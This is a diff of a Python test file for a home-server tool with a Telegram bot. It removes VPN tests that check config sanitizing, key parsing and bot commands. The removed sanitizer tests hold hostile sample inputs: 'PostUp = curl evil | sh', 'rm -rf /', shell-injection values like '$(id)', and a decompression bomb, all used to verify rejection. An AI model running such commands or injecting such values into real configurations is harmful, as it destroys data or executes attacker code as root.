@@ -1,336 +1,19 @@
-"""Публикация, Telegram и VPN. На Windows сокет и awg недоступны, поэтому система подменяется."""
-import base64
+"""Публикация и Telegram. Внешние сервисы подменяются."""
 import http.server
 import json
 import os
 import shutil
-import subprocess
 import sys
 import tempfile
 import threading
 import time
 import unittest
 import zipfile
-import zlib
 from unittest import mock
 
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
-from malinnik import alerts, bot, sites, telegram, tunnel, vpn_helper  # noqa: E402
-from malinnik.vpn_helper import KeyProblem, key_to_conf, lan_conflict, sanitize  # noqa: E402
-
-PRIVATE = "a" * 43 + "="
-PUBLIC = "b" * 43 + "="
-SHARED = "c" * 43 + "="
-GOOD_CONF = f"""[Interface]
-PrivateKey = {PRIVATE}
-Address = 10.8.1.2/32
-DNS = 1.1.1.1, 1.0.0.1
-MTU = 1280
-Jc = 4
-Jmin = 10
-Jmax = 50
-S1 = 86
-S2 = 121
-H1 = 1234
-H2 = 5-10
-I1 = <b 0xf6ab3267fa><r 10><t>
-
-[Peer]
-PublicKey = {PUBLIC}
-PresharedKey = {SHARED}
-AllowedIPs = 0.0.0.0/0, ::/0
-Endpoint = vpn.example.com:51820
-PersistentKeepalive = 25
-"""
-
-
-def vpn_uri(payload: dict, compressed=True) -> str:
-    raw = json.dumps(payload).encode()
-    if compressed:
-        raw = len(raw).to_bytes(4, "big") + zlib.compress(raw)
-    return "vpn://" + base64.urlsafe_b64encode(raw).decode().rstrip("=")
-
-
-def awg_key(config=GOOD_CONF, **extra) -> dict:
-    last = {"config": config, **extra}
-    return {
-        "containers": [{"container": "amnezia-awg", "awg": {"last_config": json.dumps(last)}}],
-        "dns1": "9.9.9.9", "dns2": "8.8.8.8",
-    }
-
-
-class KeyParsingTests(unittest.TestCase):
-    def test_plain_conf_is_kept(self):
-        clean = sanitize(key_to_conf(GOOD_CONF))
-        self.assertEqual(clean["endpoint"], "vpn.example.com:51820")
-        self.assertTrue(clean["full_tunnel"])
-        self.assertEqual(clean["warnings"], [])
-        self.assertIn(f"PrivateKey = {PRIVATE}", clean["conf"])
-        self.assertIn("I1 = <b 0xf6ab3267fa><r 10><t>", clean["conf"])
-
-    def test_vpn_uri_compressed_and_plain(self):
-        for compressed in (True, False):
-            with self.subTest(compressed=compressed):
-                conf = key_to_conf(vpn_uri(awg_key(), compressed))
-                self.assertIn(f"PublicKey = {PUBLIC}", conf)
-
-    def test_vpn_uri_fills_dns_placeholders_and_mtu(self):
-        config = GOOD_CONF.replace("DNS = 1.1.1.1, 1.0.0.1", "DNS = $PRIMARY_DNS, $SECONDARY_DNS").replace("MTU = 1280\n", "")
-        conf = key_to_conf(vpn_uri(awg_key(config, mtu="1376")))
-        self.assertIn("DNS = 9.9.9.9, 8.8.8.8", conf)
-        self.assertIn("MTU = 1376", conf)
-        sanitize(conf)
-
-    def test_uri_prefix_is_not_stripped_as_character_set(self):
-        # Распространённая ошибка: strip("vpn://") съедает и начало самого ключа.
-        uri = vpn_uri(awg_key())
-        self.assertIn("PublicKey", key_to_conf(uri))
-        self.assertIn("PublicKey", key_to_conf("  " + uri + "\n"))
-
-    def test_premium_key_without_config_explains(self):
-        with self.assertRaisesRegex(KeyProblem, "платных"):
-            key_to_conf(vpn_uri({"api_config": {"x": 1}, "containers": []}))
-
-    def test_key_of_other_protocol(self):
-        with self.assertRaisesRegex(KeyProblem, "нет настроек AmneziaWG"):
-            key_to_conf(vpn_uri({"containers": [{"container": "amnezia-xray", "xray": {}}]}))
-
-    def test_broken_uri(self):
-        with self.assertRaisesRegex(KeyProblem, "повреждён"):
-            key_to_conf("vpn://!!!not-base64!!!")
-
-    def test_decompression_bomb_is_limited(self):
-        raw = zlib.compress(b" " * (vpn_helper.MAX_DECOMPRESSED * 4))
-        uri = "vpn://" + base64.urlsafe_b64encode(b"\0\0\0\0" + raw).decode()
-        with self.assertRaises(KeyProblem):
-            key_to_conf(uri)
-
-
-class SanitizeSecurityTests(unittest.TestCase):
-    """Значения этих параметров awg-quick выполняет через bash от root."""
-
-    def test_command_keys_are_removed_in_any_case_and_spacing(self):
-        for line in ("PostUp = curl evil | sh", "postup=id", "  POSTUP  =  id", "PreUp = id", "PreDown = id",
-                     "PostDown = id", "SaveConfig = true", "Table = off"):
-            with self.subTest(line):
-                conf = GOOD_CONF.replace("[Peer]", f"{line}\n[Peer]")
-                clean = sanitize(conf)
-                self.assertNotIn(line.split("=")[0].strip().lower(), clean["conf"].lower())
-                self.assertTrue(clean["warnings"])
-
-    def test_command_keys_inside_peer_are_removed(self):
-        clean = sanitize(GOOD_CONF + "PostUp = id\n")
-        self.assertNotIn("postup", clean["conf"].lower())
-
-    def test_shell_characters_in_values_are_rejected(self):
-        for bad in ("$(id)", "`id`", "a;id", "a|id", "a&id", "a'b", 'a"b', "a\\b"):
-            with self.subTest(bad):
-                with self.assertRaisesRegex(KeyProblem, "Недопустимые"):
-                    sanitize(GOOD_CONF.replace("Jc = 4", f"Jc = {bad}"))
-
-    def test_clean_output_has_no_removed_commands_after_second_pass(self):
-        clean = sanitize(GOOD_CONF.replace("[Peer]", "PostUp = id\n[Peer]"))
-        again = sanitize(clean["conf"])
-        self.assertEqual(again["warnings"], [])
-
-    def test_trailing_command_in_comment_is_ignored(self):
-        clean = sanitize(GOOD_CONF.replace("Jc = 4", "Jc = 4 # PostUp = id"))
-        self.assertIn("Jc = 4\n", clean["conf"])
-        self.assertNotIn("PostUp", clean["conf"])
-
-    def test_required_fields(self):
-        cases = {
-            "приватного": GOOD_CONF.replace(f"PrivateKey = {PRIVATE}\n", ""),
-            "ключа сервера": GOOD_CONF.replace(f"PublicKey = {PUBLIC}\n", ""),
-            "адреса сервера": GOOD_CONF.replace("Endpoint = vpn.example.com:51820\n", ""),
-            "AllowedIPs": GOOD_CONF.replace("AllowedIPs = 0.0.0.0/0, ::/0\n", ""),
-            "адреса \\(Address": GOOD_CONF.replace("Address = 10.8.1.2/32\n", ""),
-            "разделы": "[Interface]\n",
-        }
-        for message, conf in cases.items():
-            with self.subTest(message):
-                with self.assertRaisesRegex(KeyProblem, message):
-                    sanitize(conf)
-
-    def test_invalid_values(self):
-        for old, new in (("10.8.1.2/32", "10.8.1.999/32"), ("0.0.0.0/0, ::/0", "nonsense"),
-                         ("vpn.example.com:51820", "vpn.example.com:99999"), ("MTU = 1280", "MTU = abc")):
-            with self.subTest(new):
-                with self.assertRaises(KeyProblem):
-                    sanitize(GOOD_CONF.replace(old, new))
-
-    def test_unknown_section(self):
-        with self.assertRaises(KeyProblem):
-            sanitize("[Evil]\nPrivateKey = x\n" + GOOD_CONF)
-
-    def test_future_awg_params_pass(self):
-        clean = sanitize(GOOD_CONF.replace("Jc = 4", "Jc = 4\nRekeyTimeout = 5\nContentPaddingAddition = 10"))
-        self.assertIn("RekeyTimeout = 5", clean["conf"])
-
-
-class LanSafetyTests(unittest.TestCase):
-    def test_full_tunnel_is_safe(self):
-        self.assertIsNone(lan_conflict(["0.0.0.0/0", "::/0"], ["192.168.1.0/24"]))
-
-    def test_split_default_is_safe_because_lan_route_is_more_specific(self):
-        self.assertIsNone(lan_conflict(["0.0.0.0/1", "128.0.0.0/1"], ["192.168.1.0/24"]))
-
-    def test_same_or_narrower_network_is_rejected(self):
-        self.assertIn("192.168.1.0/24", lan_conflict(["192.168.1.0/24"], ["192.168.1.0/24"]))
-        self.assertIsNotNone(lan_conflict(["192.168.1.1/32"], ["192.168.1.0/24"]))
-
-    def test_other_networks_are_fine(self):
-        self.assertIsNone(lan_conflict(["10.0.0.0/8", "fd00::/64"], ["192.168.1.0/24"]))
-
-
-class ServiceTests(unittest.TestCase):
-    """Логика сервиса: файлы во временной папке, команды awg подменены."""
-
-    def setUp(self):
-        self.tmp = tempfile.mkdtemp(prefix="malinnik-vpn-")
-        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)
-        self.iface = False
-        self.commands = []
-        conf_dir = os.path.join(self.tmp, "etc")
-
-        def fake_run(args, timeout=60):
-            self.commands.append(args)
-            if args[:2] == ["awg-quick", "up"]:
-                self.iface = True
-            elif args[:2] == ["awg-quick", "down"]:
-                self.iface = False
-            stdout = ""
-            if args[:1] == ["awg"] and args[-1] == "latest-handshakes":
-                stdout = f"{PUBLIC}\t{int(time.time()) - 12}\n"
-            if args[:1] == ["awg"] and args[-1] == "transfer":
-                stdout = f"{PUBLIC}\t1000\t2000\n"
-            if args[0] == "ip":
-                stdout = json.dumps([{"dst": "192.168.1.0/24", "dev": "eth0"}, {"dst": "default"}])
-            return subprocess.CompletedProcess(args, 0, stdout, "")
-
-        patches = [
-            mock.patch.object(vpn_helper, "CONF_DIR", conf_dir),
-            mock.patch.object(vpn_helper, "CONF_PATH", os.path.join(conf_dir, "malinnik0.conf")),
-            mock.patch.object(vpn_helper, "STATE_PATH", os.path.join(self.tmp, "state", "state.json")),
-            mock.patch.object(vpn_helper, "run", fake_run),
-            mock.patch.object(vpn_helper, "interface_up", lambda: self.iface),
-            mock.patch.object(vpn_helper, "installed", lambda: True),
-            mock.patch.object(vpn_helper.shutil, "which", lambda name: "/usr/sbin/resolvconf"),
-        ]
-        for patch in patches:
-            patch.start()
-            self.addCleanup(patch.stop)
-        self.service = vpn_helper.Service()
-
-    def stored(self):
-        with open(vpn_helper.CONF_PATH, encoding="utf-8") as f:
-            return f.read()
-
-    def test_status_never_contains_private_key(self):
-        self.service.handle({"cmd": "import", "text": GOOD_CONF})
-        self.service.handle({"cmd": "up"})
-        response = json.dumps(self.service.handle({"cmd": "status"}))
-        self.assertNotIn(PRIVATE, response)
-        self.assertNotIn(SHARED, response)
-
-    def test_full_cycle(self):
-        status = self.service.handle({"cmd": "status"})
-        self.assertFalse(status["configured"])
-        self.assertIn("error", self.service.handle({"cmd": "up"}))
-
-        status = self.service.handle({"cmd": "import", "text": GOOD_CONF})
-        self.assertTrue(status["configured"])
-        self.assertFalse(status["up"], "импорт сам не включает VPN")
-
-        status = self.service.handle({"cmd": "up"})
-        self.assertTrue(status["up"])
-        self.assertEqual(status["rx"], 1000)
-        self.assertEqual(status["tx"], 2000)
-        self.assertGreaterEqual(status["handshake_age"], 12)
-        self.assertLess(status["handshake_age"], 30)
-
-        status = self.service.handle({"cmd": "down"})
-        self.assertFalse(status["up"])
-        self.assertFalse(status["desired"])
-
-        status = self.service.handle({"cmd": "delete"})
-        self.assertFalse(status["configured"])
-        self.assertFalse(os.path.exists(vpn_helper.CONF_PATH))
-
-    def test_stored_config_has_no_commands(self):
-        self.service.handle({"cmd": "import", "text": GOOD_CONF.replace("[Peer]", "PostUp = rm -rf /\n[Peer]")})
-        self.assertNotIn("PostUp", self.stored())
-
-    def test_bad_key_keeps_old_one(self):
-        self.service.handle({"cmd": "import", "text": GOOD_CONF})
-        before = self.stored()
-        self.assertIn("error", self.service.handle({"cmd": "import", "text": "мусор"}))
-        self.assertEqual(self.stored(), before)
-
-    def test_replacing_key_while_up_reconnects(self):
-        self.service.handle({"cmd": "import", "text": GOOD_CONF})
-        self.service.handle({"cmd": "up"})
-        self.commands.clear()
-        new = GOOD_CONF.replace("vpn.example.com", "other.example.com")
-        status = self.service.handle({"cmd": "import", "text": new})
-        self.assertTrue(status["up"])
-        self.assertEqual(status["endpoint"], "other.example.com:51820")
-        self.assertEqual([c[1] for c in self.commands if c[0] == "awg-quick"], ["down", "up"])
-
-    def test_key_cutting_off_home_network_is_rejected(self):
-        conf = GOOD_CONF.replace("0.0.0.0/0, ::/0", "192.168.1.0/24")
-        response = self.service.handle({"cmd": "import", "text": conf})
-        self.assertIn("домашней сетью", response["error"])
-        self.assertFalse(os.path.exists(vpn_helper.CONF_PATH))
-
-    def test_dns_dropped_without_resolvconf(self):
-        with mock.patch.object(vpn_helper.shutil, "which", lambda name: None):
-            status = self.service.handle({"cmd": "import", "text": GOOD_CONF})
-        self.assertNotIn("DNS", self.stored())
-        self.assertTrue(any("resolvconf" in w for w in status["warnings"]))
-
-    def test_failed_up_reports_error_and_stays_off(self):
-        def failing(args, timeout=60):
-            return subprocess.CompletedProcess(args, 1, "", "[#] ip link add\nRTNETLINK: операция не поддерживается\n")
-
-        self.service.handle({"cmd": "import", "text": GOOD_CONF})
-        with mock.patch.object(vpn_helper, "run", failing):
-            response = self.service.handle({"cmd": "up"})
-        self.assertIn("RTNETLINK", response["error"])
-        self.assertNotIn("[#]", response["error"])
-        self.assertFalse(self.service.desired)
-
-    def test_restores_after_reboot_and_retries(self):
-        self.service.handle({"cmd": "import", "text": GOOD_CONF})
-        self.service.handle({"cmd": "up"})
-        self.iface = False  # перезагрузка: интерфейса нет, а состояние сохранилось
-        service = vpn_helper.Service()
-        self.assertTrue(service.desired)
-        service.keep_alive()
-        self.assertTrue(self.iface)
-
-    def test_keep_alive_records_problem_and_waits(self):
-        self.service.handle({"cmd": "import", "text": GOOD_CONF})
-        self.service.handle({"cmd": "up"})
-        self.iface = False
-        calls = []
-
-        def failing(args, timeout=60):
-            calls.append(args)
-            return subprocess.CompletedProcess(args, 1, "", "нет сети")
-
-        with mock.patch.object(vpn_helper, "run", failing):
-            self.service.next_retry = 0
-            self.service.keep_alive()
-            self.service.keep_alive()
-        self.assertEqual(len(calls), 1, "повтор только после паузы")
-        self.assertIn("нет сети", self.service.status()["problem"])
-
-    def test_unknown_command(self):
-        self.assertIn("error", self.service.handle({"cmd": "rm -rf /"}))
-        self.assertIn("error", self.service.handle({"cmd": "import", "text": 123}))
-        self.assertIn("error", self.service.handle({"cmd": "import", "text": "x" * (vpn_helper.MAX_KEY + 1)}))
+from malinnik import alerts, bot, sites, telegram, tunnel  # noqa: E402
 
 
 class AlertsTests(unittest.TestCase):
@@ -342,9 +25,9 @@ class AlertsTests(unittest.TestCase):
         patch.start()
         self.addCleanup(patch.stop)
 
-    def check(self, state="running", desired="running", system=None, vpn=None, sites=None):
+    def check(self, state="running", desired="running", system=None, sites=None):
         site = {"id": "a", "name": "Сайт", "state": state, "desired": desired, "exit_code": 1}
-        self.alerts.check([site] if sites is None else sites, system or {}, vpn or {})
+        self.alerts.check([site] if sites is None else sites, system or {})
 
     def test_short_restart_stays_silent(self):
         self.check("restarting")
@@ -389,21 +72,6 @@ class AlertsTests(unittest.TestCase):
         self.assertEqual(len(self.sent), 2)
         self.check(system={"undervoltage": False, "disk_free": 10 ** 11})
         self.assertEqual(len(self.sent), 4)
-
-    def test_vpn_silence(self):
-        self.check(vpn={"up": True, "handshake_age": 20})
-        self.assertEqual(self.sent, [])
-        self.check(vpn={"up": True, "handshake_age": 400})
-        self.assertIn("не отвечает", self.sent[-1])
-        self.check(vpn={"up": True, "handshake_age": 5})
-        self.assertIn("восстановилась", self.sent[-1])
-        self.sent.clear()
-        self.check(vpn={"up": False})
-        self.assertEqual(self.sent, [])
-
-    def test_vpn_problem_message(self):
-        self.check(vpn={"problem": "VPN не поднялся: нет сети"})
-        self.assertIn("нет сети", self.sent[0])
 
 
 class FakeTelegram(http.server.BaseHTTPRequestHandler):
@@ -645,11 +313,8 @@ class BotTests(unittest.TestCase):
         self.manager.state.side_effect = lambda: {
             "system": {"temp": 48.2, "cpu": 12, "mem_used": 10 ** 9, "mem_total": 4 * 10 ** 9, "disk_free": 2 * 10 ** 10,
                        "uptime": 90000, "undervoltage": True},
-            "sites": self.sites, "vpn": self.manager.vpn_status,
+            "sites": self.sites,
         }
-        self.manager.vpn_status = {"available": True, "installed": True, "configured": True, "up": False,
-                                   "desired": False, "endpoint": "vpn.example.com:51820"}
-        self.manager.vpn_command.return_value = {}
         self.fake_sites = {"shop": FakeSite("Магазин"), "blog": FakeSite("Блог")}
 
         def get(site_id):
@@ -717,14 +382,14 @@ class BotTests(unittest.TestCase):
     def test_status_overview(self):
         self.bot.handle(self.message("/status"))
         text = self.texts()[0]
-        for part in ("48 °C", "Не хватает питания", "VPN: выключен", "Магазин: работает", "Блог: упал", "порт 8100"):
+        for part in ("48 °C", "Не хватает питания", "Магазин: работает", "Блог: упал", "порт 8100"):
             self.assertIn(part, text)
 
     def test_keyboard_words_and_bot_suffix(self):
         self.bot.handle(self.message("Статус"))
         self.bot.handle(self.message("/status@my_bot"))
         self.assertEqual(len(self.texts()), 2)
-        self.assertIn("VPN:", self.texts()[1])
+        self.assertIn("Малина:", self.texts()[1])
 
     def test_start_shows_help_with_keyboard(self):
         self.bot.handle(self.message("/start"))
@@ -803,10 +468,9 @@ class BotTests(unittest.TestCase):
         self.manager.action.assert_not_called()
 
     def test_forged_button_cannot_skip_confirmation(self):
-        for data in ("do:stop:shop", "do:publish:shop", "do:unpublish:shop", "do:vpn_up:", "yes:выдуманный"):
+        for data in ("do:stop:shop", "do:publish:shop", "do:unpublish:shop", "yes:выдуманный"):
             self.bot.handle(self.press(data))
         self.manager.action.assert_not_called()
-        self.manager.vpn_command.assert_not_called()
 
     def test_no_delete_command(self):
         self.bot.handle(self.message("/delete shop"))
@@ -862,25 +526,6 @@ class BotTests(unittest.TestCase):
     def test_logs_button_can_show_deploy_log(self):
         self.bot.handle(self.press("logs:deploy:shop"))
         self.assertEqual(self.texts()[-1], "строка установки")
-
-    def test_vpn_needs_confirmation(self):
-        self.bot.handle(self.message("/vpn on"))
-        self.manager.vpn_command.assert_not_called()
-        self.assertIn("Включить VPN", self.texts()[-1])
-        self.bot.handle(self.press(self.button_data("Да")))
-        self.manager.vpn_command.assert_called_once_with("up")
-
-    def test_vpn_card_toggle(self):
-        self.bot.handle(self.message("/vpn"))
-        self.assertIn("выключен", self.texts()[0])
-        self.bot.handle(self.press(self.button_data("Включить")))
-        self.bot.handle(self.press(self.button_data("Да")))
-        self.manager.vpn_command.assert_called_once_with("up")
-
-    def test_vpn_output_has_no_secrets_and_handles_missing_service(self):
-        self.manager.vpn_status = {"available": False}
-        self.bot.handle(self.message("/vpn"))
-        self.assertIn("не запущен", self.texts()[0])
 
     def test_edit_not_modified_is_not_an_error(self):
         def failing(method, payload, timeout=15):
